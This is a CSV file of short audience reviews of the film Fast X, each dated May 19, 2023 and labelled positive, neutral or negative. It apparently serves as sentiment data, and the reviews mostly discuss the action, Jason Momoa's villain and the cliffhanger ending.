Date,Score,Reviews
"May 19, 2023",POSITIVE,Lot of action scenes. Story line a little hit and miss. Oh yeah! Cars can fly. Spoiler alert..... Expect a continuation next year of the Fast & Furious franchise.
"May 19, 2023",POSITIVE,I loved it so much. Only thing I would change is not having to wait for the next release
"May 19, 2023",POSITIVE,Movie was well acted and nice just did not like that they never ended the episode.
"May 19, 2023",POSITIVE,"Loved the movie. Obviously it is not realistic anymore like the first few films, but more into sci-fi. Having this thought and knowing this as you watch the movie, it was really enjoyable and lots of action! Can’t wait to watch the next one!"
"May 19, 2023",POSITIVE,Not really much to dislike. I’m a die hard fast and furious fan since the beginning. They’ve all been fundamentally good and tear-dropping great.
"May 19, 2023",POSITIVE,Jason Momoa played one of the best villains by far glad I spent the $20 to see it in D-Box had a lot of action scenes
"May 19, 2023",POSITIVE,I don't like the end
"May 19, 2023",POSITIVE,"A return to form, one of the best in the saga"
"May 19, 2023",POSITIVE,The story line and all of the action!!!  Jason Momoa played his character very well!!!  Loved how all of his enemies reunite for the greater good.  And I knew that fall should have killed Gisele!!!  Love how Paul Walkerocharacter was still included!!!
"May 19, 2023",POSITIVE,"OMG 
Action, Love, Suspense...
the Best!!!"
"May 19, 2023",NEUTRAL,"Beyond belief… Dom and the team were always on the edge of defying physics, but now it is bordering on ridiculous. I love this “Saga” and its family/characters, but really struggled with Fast X."
"May 19, 2023",NEGATIVE,"It's a fast and the furious movie, what do you expect? I had high hopes but crashes and burns minus Jason Momoa."
"May 19, 2023",POSITIVE,Loved all of the special effects.  Lots of action.  Would have liked to see that They made it at the end.
"May 19, 2023",NEGATIVE,Cash grab.  Everyone is coming back from the dead.
"May 19, 2023",NEUTRAL,It’s good in its own way. But we’re still missing Paul and when movie 9 ends with him pulling up we definitely expected to see the AI version of him that was rumored to be a thing.
"May 19, 2023",POSITIVE,"This film, as did previous versions, broke every single law of physics and automotive engineering. Crazy twists and turns all throughout the movie. Jason Mamoa was the comic book mastermind villain this franchise needed. As over-the-top and as ridiculous as it was, Id watch it again in a heartbeat. Just complete mindless fun."
"May 19, 2023",POSITIVE,I loved it lots of action
"May 19, 2023",POSITIVE,Lots of action but ending left you wanting more.
"May 19, 2023",NEGATIVE,"Wouldn’t have watched if I knew Brie Larson was involved, not a bad movie, tired of seeing women as the intellectuals and men as dumb idiot side kicks, I thought sexism was a bad thing? "
"May 19, 2023",POSITIVE,I liked it from beginning to end cant wait for the best one to come out.
"May 19, 2023",POSITIVE,Was good! The ending was not the best!
"May 19, 2023",POSITIVE,"Loved it! Family drama and unrealistic stunts are the hallmark of the Fast series and boy did they DELIVER! Entertaining from start to finish and left me eager for part 2. 

Best at #AMC of course!"
"May 19, 2023",POSITIVE,The movie was awesome. Definitely worth it
"May 19, 2023",NEGATIVE,Horrendous movie. Terrible acting. Poor story telling and terrible script. What a waste of time.
"May 19, 2023",NEGATIVE,"Wow, I can't believe they even decided to put this together. The movie ended just horribly. It will leave you asking WTF? No after action scene like all the others. There is a surprise at the end before the credits though. Also stick around for the credits. There is a scene 2 mins in. Other than that this movie just passed the time. Wasn't all that great at all in my opinion."
"May 19, 2023",POSITIVE,Best villain this far. Best $20 I’ve spent on anything all year😭
"May 19, 2023",NEUTRAL,"Perfect family Movie But Fast And Furious fans want Brian o Corner . We Are Tired From This family aroma . But this Movie is better Than previous but It Can be Legendary,  Well Exited for next squel ❤"
"May 19, 2023",POSITIVE,Excellent movie with a good enough story to keep you riveted the entire duration of the movie. My only complaint is I have to wait until 2025 for part 2 which seems crazy. If you like Fast and Furious then you should love this movie.
"May 19, 2023",POSITIVE,"Action packed, stay for the trailer at the end"
"May 19, 2023",POSITIVE,"Awsome, Spectacular, Amazing in every way, Every Cast deserves those minutes that they had, Jason Momoa was a splendid version of the joker, charismatic, and very careful with details, Brie Larson Killed it as Tess, as well as Daniela Melchior's Isabel, even the legendary cast made a very Great impact, deserves a part 2 and part 3, but needs something different, something new alongside Keeping the theme in order to get with a bang 🌟, recommend to go see this movie, deserves every minute."
"May 19, 2023",POSITIVE,This movie was super fun Jason mamoa was born for the villain role in that movie and amazing but I didn't like the fact they Killed Jacob (John Cena) When they bring hobbs back(the Rock)💔
"May 19, 2023",POSITIVE,Love.... Love...... Loved it. The Keep getting better and better.
"May 19, 2023",POSITIVE,"You laugh, you cry.. and in ways that only matter if you were there from the beginning. Whoever doesn't want 10-20 of these movies has some serious issues.

Expectations: 10/10 
Action: 10/10
Fun: 10/10
Heist: 10/10
Momoa: 10/10
Family: 10/10"
"May 19, 2023",POSITIVE,Entertaining from start to finish. Love this franchise!
"May 19, 2023",POSITIVE,Lots surprise faces and actions. Some action silly though but enjoyed watching it
"May 19, 2023",NEUTRAL,It was a great movie but just not much action to be called an action film wish I can get a refund for it
"May 19, 2023",POSITIVE,It was absolutely incredible! I loved every second of it and can't wait for Part 2. The story in this one is incredible and a perfect way to start the beginning of the end of the Franchise.
"May 19, 2023",POSITIVE,Movie was great fun to watch definitely recommend to watch it on Dolby amc
"May 19, 2023",POSITIVE,"Action-packed, fun and The Rock was clutch again!"
"May 19, 2023",NEGATIVE,"The Fast and Furious died after the 2nd movie
When will they end this nightmare?"
"May 19, 2023",POSITIVE,"Enjoyed the movie.  A little more violent then some of the past movies, with more collateral damage. The bad guy was crazy— deranged, a little scary, and sometimes funny. The action was over the top. Left us with a cliffhanger with the next one expected in 2025."
"May 19, 2023",NEGATIVE,"Funny I guess if you enjoy laughing at a movie. Full of cheese, over the top acting,  silly dialogue and a scrambled egg of a plot.  Sort of like watching a cartoon with cars  but with a soap opera tone.  A disaster."
"May 19, 2023",POSITIVE,one of the best fast movie I done ever seen
"May 19, 2023",NEUTRAL,"While the film is uncoordinated and is a bit poorly directed from time to time, Fast X embraces what it is and provides fun wall-to-wall action, an entertaining villain and virtuous cast chemistry."
"May 19, 2023",NEGATIVE,worst f&f movie yet extremely unrealistic and really bad ending and story
"May 19, 2023",POSITIVE,"What a welcome return to more of what most came to love with the FF franchise. This movie really has something for everyone whether you’re a fan of the street racing era from 1-4 or more action from 5-present. This movie really subverted a lot of my expectations, Jason Mamoa is the best villain of the series, and it seems to set the stage for quite a finale. Really loving that the story is slowly starting to come full circle with past characters and events. I haven’t been this satisfied and also curious for the future walking out of a Fast movie since 2015 with Furious 7. There may have been a scene or two that felt like they could be cut but overall I’m really happy with this film and how it mixed things up. I’m pumped for this director to come back and helm Fast 11. This is a must see for a FF fan."
"May 19, 2023",POSITIVE,"Llena de acción como todas las peliculas de la saga, una gran pelicula para un domingo por la tarde."
"May 19, 2023",POSITIVE,Loved the movie! But I hate that it just left us hanging :( also the movies theater speakers were so loud like louder than it normally Is
"May 19, 2023",POSITIVE,Its as good as it get with the Fast films. Expect the over the top movie scenes. Make sure to practice: Suspension of disbelief.
"May 19, 2023",NEGATIVE,"A movie that doesn't take factors like 'Gravity'... 'Laws of Physics' 'Dead and staying Dead' into account. It was bad, but I still couldn't help but enjoy some of the action. Jason Mamoa is the standout in an otherwise below average Fast entry."
"May 19, 2023",NEGATIVE,Not great. Probably the worst in the franchise but I WILL be back for the next one.
"May 19, 2023",NEUTRAL,They hinted it was going to be last oneNOPE!
"May 19, 2023",POSITIVE,"I would put this movie right above F8 and Hobbs/Shaw's spinoff in that order and under Furious 7, Fast 5, and F6, in that order as a hilarious and entertaining entry in a lifelong blockbuster franchise full of melodramas."
"May 19, 2023",POSITIVE,"This movie was so fun to watch. I liked every bit. The villain, the comedy, the action, and the feels. They split the family up on their own journey to come back to each other like LOTR. I can't wait for the next 2 films"
"May 19, 2023",NEUTRAL,"A disclaimer before I start: the Fast & Furious franchise (today) is a franchise that will only satisfy the fans of the series. People who don't care about the series or those who haven't watched the films, will find this tedious and stretched out.

Fast X is directly linked to Fast Five, wherein Dom & team steal a huge safe and in the process kill Hernan Reyes. His son, Dante played by the charismatic & unhinged Jason Mamoa is now out for revenge. 

I had not watched a single F&F film till the fifth movie (one of the best) released. After which, I sat and watched every single one of them; with just the 8th installment in the theatres (one of the worst). To be honest, the first four installments did not peak my interest. The real fun began with the 5th film when they films become more about heists & they started linking the films; this blew my mind. All that excitement ended with the 7th film. The 8th & the 9th installments were a step down and unnecessary. But Fast X is far better than the previous two films and sets up an exciting finale filled with characters that you have come to love. 

Jason Mamoa's performance is the highlight of Fast X. He is really good; his best performance till date! Everyone else do what you expect them to do. The action set pieces are well choreographed & so is the well setup twist at the end. Alan Ritchson, Brie Larson, Rita Moreno & Daniela Melchior make their franchise debuts. The film also brings back some fan favourite characters that will surely pump you up for the finale. 

Fast X is all about family, forgotten (read dead) characters resurfacing, a cliffhanger ending and an excellent Jason Mamoa. Fans of the franchise, do watch it. Others can choose to stay away."
"May 19, 2023",POSITIVE,It was typical fast and furious fare! They keep upping themselves on the stunts! The Cliffhanger was an interesting twist! If you are a fan you will love it! It's a classic popcorn movie!
"May 19, 2023",POSITIVE,Good movie I love it I can’t wait to order my tickets for the next one
"May 19, 2023",POSITIVE,"Better than expected.  Jason Mamoa is HILARIOUS. He should have been in the other series. Script and writing is a little more developed.  Still has its movie moments, but I was overall entertained. The series continue its cameos. Watch the after credit scenes"
"May 19, 2023",POSITIVE,Fast X was awesome. Can't wait for the next one.
"May 19, 2023",POSITIVE,This movie was really awesome two thumbs up 👍🏾 👍🏾
"May 19, 2023",NEUTRAL,Some of the stuff in the movie is silly but Great car and fight Actionand Jason Mamoas performance make this a fun weekend watch.
"May 19, 2023",POSITIVE,"The film is so great it was about time that Brian O'Conner mae an appearence I loved it even it was in a flashback. I loved so much the character of Jason Momoa and also the amazing job he did in this role as sadistic, machiavellian person, very funny, reckless, fearless villain. He is the best in being the worst villain of the entire franchise. No other villain was as good as him."
"May 19, 2023",POSITIVE,"I dont know why critics hate this movie.... But i love it. The plot , the story, the details enough for me.. i really enjoyed."
"May 19, 2023",POSITIVE,"Good movie and better than expected. Great to see all the old team together, and the action was great!  The ending promises more to come."
"May 19, 2023",POSITIVE,"It was a thrill ride from the start to finish and it was exactly what I thought it would be...a little ""out there"" for the car stunts.  Jason Momoa plays a great sadistic character who is off his rockers with some comedy thrown in...he reminded me of a version of the Joker."
"May 19, 2023",NEUTRAL,"Fast X had a job to deliver an action movie that has great action that is riddled with impossible situations. This is a part of the allure of the franchise that has been the driving force that has led to 11 films with more on the way. It is not without its flaws, major ones at that, but they're the type of issues that get somewhat of a pass due to the type of movie they're in. In fact, the flaws help make the movie fun.

Dispensing with the bad, don't expect the plot to make a lot of sense. It's basic, but convoluted to the point where you just go along for the ride. There's 3-4 too many characters and at least 10-20 minutes worth of run time that can be cut out. But the time we spend with these characters and the added run time do not equal a movie that drags or ever gets too boring. What works is the comedy, action, and a memorable villain (that perfectly balanced being goofy but also fearful). It's not a comedy, but some of the characters and the situations they're in allow natural comedy to happen. What's not natural is the laws of gravity and technology. The action scenes that happen can only play out in a movie like this, so when a bomb makes its way through Rome barreling it's way through 10,000 obstacles, we appreciate its ridiculousness that not many movies can provide.

If this were a script for most action movies, it would result in a much lower rating. Fast X has a script that could purposely be bad to make the ridiculous action pull can be more easily swallowed. Quite simply, the only way you won't like this movie is if you don't like this franchise. It's better than some of the Fast movies, not as good as others, but is for sure a fun time with some standout action scenes."
"May 19, 2023",NEGATIVE,"Two words for you, ho key. OMG was this over the top. Save your money."
"May 19, 2023",POSITIVE,I love this movie it had so much action packed I love it . We need more movies like this
"May 19, 2023",NEGATIVE,This movie is not a movie anymore. It's called 4k quality fx effect's. So unrealistic doesn't makes any sense at all.
"May 19, 2023",POSITIVE,Absolutely awesome and amazing and all the call backs and cameo appearances were awesome. The post credits scene was bananas
"May 19, 2023",POSITIVE,I loved the movie.  I was a little disappointed I didn't realize it was going to be part of a trilogy until right before the movie started though.  It had some real weird and unexpected twists that made the movie very entertaining as long as you are not overly sensitive to weird stuff.   I saw it on early premiere night and the people that were there all seemed to react positively multiple times.
"May 19, 2023",POSITIVE,A lot of action and great actors
"May 19, 2023",POSITIVE,This was an absolute masterpiece! Holy shit!
"May 19, 2023",POSITIVE,"Il film è un susseguirsi di eventi rocamboleschi. Ottima la scelta delle autovetture e sono rimasto colpito in positivo dalla scelta, in particolare, del marchio alfa romeo (ancora una volta). Jason Momoa scritto da Dio. Il finale mi ha lasciato a bocca aperta perché rimane tutto in bilico. Felice per il ritorno di Gal Gadot nel ruolo di Giselle."
"May 19, 2023",POSITIVE,I LOVED EVERYTHING!!!!!!
"May 19, 2023",NEUTRAL,"The plot is absurd, but the action and the acting are enough to make this a fun movie to see.  It is a cliffhanger, however, so the final ride will have to wait for Fast 11."
"May 19, 2023",POSITIVE,Some parts were cheesy and Jason Mamoa isnt really the villain type it wouldve been better with Alan Richardson as the main bad guy. But what was good about this one was seizing Elenas sister and this one was truly about family and I admire that.
"May 19, 2023",POSITIVE,Very exciting and action PACKED!
"May 19, 2023",POSITIVE,I think it is a fucking nuclear bomb
"May 19, 2023",POSITIVE,WWOOOOWWWWWW THAT REVEAL THOUGH LOL
"May 19, 2023",NEUTRAL,"Worse cliff hanger than Empire Strikes Back, much worse. More like Infinity Wars, except for me a marginal movie that now expects me to wait 2 years. And,  it expects you to know who everyone is, even if they dies 6 movies ago"
"May 19, 2023",POSITIVE,Loved the action.. the fact that they stick together as a team. Love the surprises.. loved the ending.
"May 19, 2023",POSITIVE,"Fast X reaction.

Vin Diesel y sus secuases no dejan de asombrar al espectador cuando se trata de carros, embustes, momentos de acción y sobre todo un villano al fin memorable como lo fue Jason Momoa como Dante Reyes. Dante fue un poco gracioso para mis gustos pero como dice mi brother Alejandro Salas tenia ese toque genuino al.estilo Joker para una pelicula tan grande como lo es Fast X. Esta vez se fueron en grande, viejos y nuevos personajes se unen a esta gran historia que nunca acaba, Dom,Lety,Roman,Han,Tej,Mia,Little Brian y Ramsey viven una vida mas tranquila antes de que de la nada Cipher es atacada por Dante dandonos un tour masivo a los filmes anteriores pero concentrandose mas en los acontecimientos de Fast Five, la.muerte de Hernan Reyes tiene un pequeño maniaco con sed de venganza y esta vez no solo es con ""La Familia"" si no con todo lo que los rodea.

Que me gustó de la pelicula? ✅️

-El guión a pesar de sus grandes criticas nos lleva a un viaje emocionante con todos los integrantes de La Familia, eso si mucho mas personajes nuevos fueron añadidos a la historia, dandole centro a Dante (Momoa) como el villano principal, Little Nobody(Eastwood) vuelve en su papel como uno de los agentes de Nobody(Russell), la hija, Tess (Brie Larson), Aimes (Alan Ritchson) y Jakob (Cena) entran al espectaculo. Todo se prende en la madre cuando con esa sed de venganza Dante tiene de objetivo matar a toda la familia, llevandolos a diferentes trampas en lugares objetivos en Roma, ahi se prende el primer acto de la movie, destruyendo casi toda la ciudad de una manera violenta, pero ya ustedes saben que los embustes acaban de comenzar.

-Todos los personajes brillan en pantalla no hay ni uno que les pueda decir que fue dejado atras en cualquier escena de los 3 actos, Dom siempre dandonos momentos de acción masivos, mientras que los demas entre chistes y desesperación hace que el filme entretenga en todo momento a pesar de los embustes y el carro indestructible de Toretto, ese maldito Charger yo lo quiero en mi vida.

-Dante... mano tengo que decir que es el centeo de la movie, dandonos un espectaculo al ser presentado como un villano digno de esta saga, sarcastico,despiadado, medio fino en momentos pero ese personaje tanto ajita como encanta. De veras que llevó a un nivel a cada personaje con todo el desmadre que dejo en el final de la pelicula eso hace que sea demasiado memorable y guste mas aún.

-Siempre Fast se destaca por los carros que utilizan y a pesar de irsele la magia de carreras clandestinas volvemos a un lugar que muchos de P.R. van a notar, pero debo decir Brasil. Al fin vemos un momento que todo entusiasta de carros les va a encantar y ese Standoff entre Dom y Dante quedo en la madre.

-Hay algo ue dejare dicho como que me gustó de la pelicula fueron sus embustes, mano... tu sabes la que hay esto es Fast and Furious diviertete, pasala bien con tus panas, no cojas luchas si ya pasaste por Fast 9 que fueron al espacio, al menos aqui no llaman al Millenium Falcon con Han Solo tratando de ayudarlos a llegar al Death Star.

-De peleas tengo que darle el #1 spot es a Letty(Michelle Rodriguez) vs Cipher(Charlize Theron) esas dos bastardas se dieron hasta con el banco de la esquina, lo dieron todo y lo mas seguro ganarán Fight of the Year en los Mtv Movie Awards l, como mención honorifica Deckard Shaw(Statham) vs Han(Sung Kang).

-Esta es la primera de una ultima trilogia que los dejará mordidos por uno o dos años mas de espera, pero que lo mas probable por diversión la veras varias veces, so falta Fast 11 y Fast 12 pars culminar este desmadre.

Que no me gustó de la pelicula?⛔️

-Cosas que podria decir que no me gustaron pues en parte es los mega embustes, no se dan ni un razguño mano y esos carros estan reforzados con Adamantium por mi madre.

-Jakob(John Cena) lució como un tonto a diferencia de Fast 9 que se veia amenazador y el unico que le podia meter las manos bien duro, aqui fue el comic relief de no estar Dante en pantalla eso si me ajito alguito, pero nada tenia que picharle pq si lo cojia en serio la movie lo las seguro tocaba la Clasificación C.

-Hubo una parte tan y tan embustera y violadora de fisica entre Dom y su hijo Brian que por mi madre mori cuando la vi, les digo sus faltas son las ganancias de fans que le gusta y le divierte este tipo de cosas, pero al menos esta 10ma entrega esta mejor que Fast 9 y por mucho.

P.s Su final quedo en la madre y ese REVEAL ESTA 🔥🔥🔥🔥🔥
Solo tiene un MID CREDITS y les aseguro QUE LES VOLARÁ LA CABEZA.

Clasificada: B
8/10 Great!"
"May 19, 2023",POSITIVE,"I really liked it, just don't want to give any spoilers, just a bunch of surprises."
"May 19, 2023",POSITIVE,This is my 2nd time watching the MOVIE!!!
"May 19, 2023",NEUTRAL,"I didnt get enough cars from one of the kings of breakneck car drama in Leterrier, but there is enough madness, laughs, and crazy stunts to make for more fun than the MCU has dished up recently."
"May 19, 2023",POSITIVE,"Talk about mindless fun entertainment. The best popcorn movie in a really long time. Ridiculously crazy mad entertainment. The movie is everything but nothing at the same time. Definitely a good watch with friends and ""family"". Big W."
"May 19, 2023",NEGATIVE,More of the same although entertaining it's time to end the franchise.
"May 19, 2023",POSITIVE,Everything that went on was insane and defied the laws of physics.  But it was wildly entertaining.
"May 19, 2023",POSITIVE,"Great action.
Ending left too much unsaid."
"May 19, 2023",NEGATIVE,"Senseless plot, very poor, cardboard acting (Mark Sinclair, big surprise) and overly ridiculous stunts/crashes.  Definitely made for a specific type of audience."
"May 19, 2023",POSITIVE,"Very good movie, just to have fun! There are some unrealistic things but most movies do! Has me excited for part 2!!!"
"May 19, 2023",POSITIVE,Great movie! Lots of action. Tons of surprises. Jason Momoa is an awesome edition.
"May 19, 2023",NEGATIVE,"I don't like that it ended on a cliffhanger. Out of nowhere this turned into a Marvel movie with a bad ending, only to come back with a good ending?"
"May 19, 2023",POSITIVE,Great. Full of action scenes
"May 19, 2023",POSITIVE,We both enjoyed this high action film and are looking forward to the sequel!
"May 19, 2023",POSITIVE,Jason Mamoa was the perfect villain.
"May 19, 2023",POSITIVE,"Action packed.
Loved Rita Moreno.
Jason Momoa can play crazy very well. 
the ending was student the past ones but I like the cliff hanger. 
I love the photos throughout the movie.  it's the respect to Paul Walker. Also love the mix of the villans from past movies to allies with this one."
"May 19, 2023",POSITIVE,It is Part 10 of series - Fun movie.
"May 19, 2023",POSITIVE,"Great action but no story, Jason's acting 10/10"
"May 19, 2023",POSITIVE,"I am a Fas-Furi fan for life!! I loved everything about it the fam all together, the new additions to the saga and the plot Love love loved it!! The ending definitely had me sitting on the edge of my seat with my hands to me face!! Cant wait for the next one!!"
"May 19, 2023",POSITIVE,Movie was awesome! 4DX was good too but the smoke effects where lame. Not enough.
"May 19, 2023",POSITIVE,"Yeah, you can not do all that stuff in cars, but the action is fun, and it brings all the past movies together."
"May 19, 2023",POSITIVE,Liked how it followed the story in Fast 5. And lots of putting family above anything else.
"May 19, 2023",NEUTRAL,I disliked that it ended on a cliffhanger
"May 19, 2023",NEGATIVE,"As a longterm fan of the franchise, I find all reasons to compliment the movies. However, I've been struggling past no. 7. This recent instalment is the final nail in the coffin. Dreadful is an understatement. I won't be watching any future instalments. They've sucked the franchise dry. It should come as no surprise they are splitting these 'final' instalments into three parts. Money talks, unfortunately."
"May 19, 2023",POSITIVE,"Well let's get the negative out of the way because this movie was elite for the franchise. The negative is that the action sequences are glaringly inaccurate to the point that in multiple scenes you just have to turn your brain off. Which is advisable anyway after the last installment of the series. 

Well that's enough of that. The characters in this movie are some of the best the franchise has ever introduced, possibly since the first movie, but at least since Hobbs. They are wildly entertaining, deeply imaginative, and carry a point of view that is a welcome relief to brooding executive type villains and predictable heroes. The comedy is the best the franchise has ever utilized. Years of character building has given the writers comedic layups that they regularly make, but this movie goes further. The comedy in this movie is top-flight because it takes risks and utilizes side characters to build on. The laughs really take the pressure off the action sequences. Third, the plot is nearly impeccable. The movie deftly handles what other franchises labor to resolve which is looking back. Fast X relies upon other movies in the series in logical ways, and therefore doesn't belabor the point. In fact, Fast X feels like it was always the plan, even tho it wasn't. The writers don't give the feeling of ""encore"" cinema; franchises that extend beyond their life due to popularity. The story is riveting start to finish. Lastly, the cars in this movie are orgasmic. Incredible vehicles put under the bright lights make this film a brilliant microscope on vehicles.

All in all:

Overall grade: A-

Action: C-
Comedy: A+
Characterization: A
Plot: A
Acting: A+

2 and a half hours flies by"
"May 19, 2023",POSITIVE,"Action packed summer thrill ride! Great story, unexpected twists. Can't wait for FAST XI."
"May 19, 2023",NEUTRAL,I liked it... but it seem they took the family friendly turn.
"May 19, 2023",POSITIVE,Best film ever for sure gonna have to go back and watch again with the family.
"May 19, 2023",NEUTRAL,"The Beginning of the End.

The Fast Family is back for their final chapter and the outrageous scenes are in full throttle. This franchise never fails to break the laws of physics while also providing an entertaining film from beginning to end. Jason Momoa and Alan Ritchson provided the best performances in this film and help carry whatever screen time they had proving to be some of the better additions to the cast and I am excited to see what they bring in the next two instalments of Fast X. With that being said this film was far from perfect. There were quite a bit of scenes in this film that dragged or were useless but makes sense that they had to keep them as this is the first of a three part film. Typical unbelievable stunts lead to CGI that don't look good and feels like a video game cut scene really take me out of it. Overall I did enjoy this and have it rated as a partial rating as the story is not finished yet. We shall see how this story concludes."
"May 19, 2023",POSITIVE,Hated that the ended wasnt the ending and that we have to wait for another one to come out!
"May 19, 2023",POSITIVE,It's about da family
"May 19, 2023",POSITIVE,"What a great movie. This movie has action, emotions and comedy as well. 200+ people reacting on different scenes at the same time was amazing feelings. I saw this movie in Dolby at AMC Theater. An amazing experience. I love all cast, but Jason is one of my favorite actors. I loved it, specially punching bag that he was using. Lol. I also bought FastX car (Popcorn tin) at AMC theater. The whole experience was amazing. Thank you Fast family, Dolby and AMC for making my experience great. I will watch this movie again over the weekend for free using my AMC A-list membership."
"May 19, 2023",NEGATIVE,Weak. Poor script. Unreal action scenes.
"May 19, 2023",NEUTRAL,"It's not a bad action movie, but it really shows, that Toretto and the family has to go. Ride off into the sunset, it's time. The thing is, that the core cast is pretty boring, only the newcomers can deliver great performances and some much needed fun, and curiosity. Jason Momoa really thrives, it's one of his very best performances so far, Daniela Melchior is great too. The plot is badly written and dumb sadly. Feels like random people from the franchise thrown in together for the movie, but this chaotic ensemble doesn't really sticks together. The glue is missing sadly. These movies provided fun for years, but they can't offer anything new, so they have to go for good."
"May 19, 2023",NEGATIVE,"Es una mala película sin más, no tiene buena trama y lo único bueno es el villano interpretado por Jason Momoa"
"May 19, 2023",NEGATIVE,Movie is so long and Vin Diesel is clearly running out of ideas for this franchise but at the same time wants to milk the most of it. It’s like milking a dead cow. Just let the franchise die already!! It’s pathetic at this point. We know you keep working on this franchise because of the rest of Hollywood won’t take you seriously as an actor.
"May 19, 2023",POSITIVE,"This movie felt like it was fan written (and I mean that as the highest compliment). It had everything you want and expect from a fast movie and more! 

Jason Momoa feels like he had the time of his life on this set. He's so fun to watch. Dom is still Dom and all the other family members have perfect scenes that highlight the best traits of their character. 

If you are a Fast Fan, you won't be let down!"
"May 19, 2023",POSITIVE,"Greatest movie ive ever watched so far,,,,,,,,,,, pretty sure will go back to cinema to watch it again🙌🏻🙌🏻🙌🏻"
"May 19, 2023",NEGATIVE,"It's just bad, the dialogue was subpar and it just lost its essence"
"May 19, 2023",NEUTRAL,The movie was good but it was a lot of people talking 2 kids being loud and cursing
"May 19, 2023",POSITIVE,Great movie must see this
"May 19, 2023",POSITIVE,Amazing. Family is back on the menu.
"May 19, 2023",POSITIVE,"Continuity of the story was fantastic.  As always, suspend disbelief!  But it was a Fast & Furious ride for sure! And the two surprise appearances at the end? So fun!"
"May 19, 2023",POSITIVE,"It was action packed, fun and some what unpredictable. With the ending it had to be an 11."
"May 19, 2023",POSITIVE,"Fast X brings back the stakes and high emotions that were missing for many years, manages it's huge family pretty well, contains a great performance by Jason Momoa, and still has the over-the-top action (although brought down a little bit)."
"May 19, 2023",NEUTRAL,"Fast X is probably a top 5 Fast and the furious movie, the performances were great all around and it’s action packed from start to finish and Jason momoa is a great villain  he is funny and serious when needed the movie is balanced well as almost everyone has their moment to shine a good 8.5/10"
"May 19, 2023",NEGATIVE,The way they had Jason momoa acting ruin the movie
"May 19, 2023",POSITIVE,This movie was non stop action! I love how the storytellers tie everything together! If you’re a fan of fast and furious this one won’t disappoint! Go into the movie and just enjoy the ride as we come to the end! Can’t wait for part 2 and 3! Family! 
"May 19, 2023",POSITIVE,"If you liked any of the previous 9 films, you are going to love this one! Was a really fun ride."
"May 19, 2023",NEGATIVE,At this point they’ve overplayed their hand . Films gotten stale
"May 19, 2023",POSITIVE,Loved the movie! It was great to see them all on our screens again and how the work well together! Can’t wait for the next installment!!
"May 19, 2023",POSITIVE,The movie was good I just wish the couple in front of me wouldn't be so lovey dovey it takes away the movie experience for me personally and it's really cringy😔😞
"May 19, 2023",POSITIVE,Better than f9! Jason mamoa steals the show and everyone that returned was awesome! Interested on how they are going to end it now stay after credits !
"May 19, 2023",NEGATIVE,"If it wasn't for Aquaman, the movie would just be another boring bit about family and ridiculous car obsessions and chases that we all know, no one could possible survive, physically or mentally. 
Did I mention the constant annoying family talk. Olive Garden gave them permission for this????? Anyway. If there are more movies in this franchise, I don't think I will be watching anymore."
"May 19, 2023",NEUTRAL,"Really doesn’t detach itself very far from the previous movies. Looks fantastic and is joyful to watch, but adds little to the repeated formula. Started out very strong but lags as it goes on and certain twists don’t even catch too much audience attention. A few moments showed impressive attention to detail."
"May 19, 2023",POSITIVE,It was awesome. Loved Jason Momoa. Cant wait to see it again
"May 19, 2023",POSITIVE,Muy buen servicio? A veces pero hay un personal  bien feos en la ventanilla
"May 19, 2023",NEGATIVE,I feel like that was 1 of the top 3 stupidest movies I have ever seen in my life. I cannot begin to explain how stupid this movie is. From 1 to 10 it's 300 on the stupidity range. They didn't even have a decent car anywhere in it. John cena smuggled a plane onto a plane. Holy hell it is so stupid.oh and BTW they have a submarine now. Because apparently if you have the skill to not turn the wheel for 10 seconds you can manipulate a submarine. I cannot convey how stupid this movie is
"May 19, 2023",POSITIVE,"Loved It!!!  Lots of car chases, explosions, and all out ridiculousness that we want from this franchise."
"May 19, 2023",POSITIVE,Exceeded Expectations
"May 19, 2023",NEGATIVE,Should have really stopped after Furious 7. Boring. Over the top nonsense.
"May 19, 2023",POSITIVE,"It was a good movie , lots of action and funny comedy great for solo or family ."
"May 19, 2023",POSITIVE,"In terms of the franchise it's what you might expect. Impressive cast list. But Jason Momoa's portrayal of Dante is everything. If you are a Momoa fan or follow his work you'll no doubt enjoy this. He certainly made it for me. Momoa brings all the fun, quirky, unique masculinity/femininity traits he personifies in real life. He brought the spice in all the good ways. Bless 😊🙏🏼💗"
"May 19, 2023",POSITIVE,"Great addition to the Fast Franchise! Way to bring the movie back to earth with a lot of action, humor and honor to the family! #FURIOUSLYFUN"
"May 19, 2023",NEGATIVE,Continues to get further and further away from what got the movie series off the ground. Everything and everyone appears to be indestructible. They could've also just called it Expendables 4: The family.  And you wouldn't know the difference.
"May 19, 2023",NEGATIVE,cinematic equivalent of a monster energy drink.
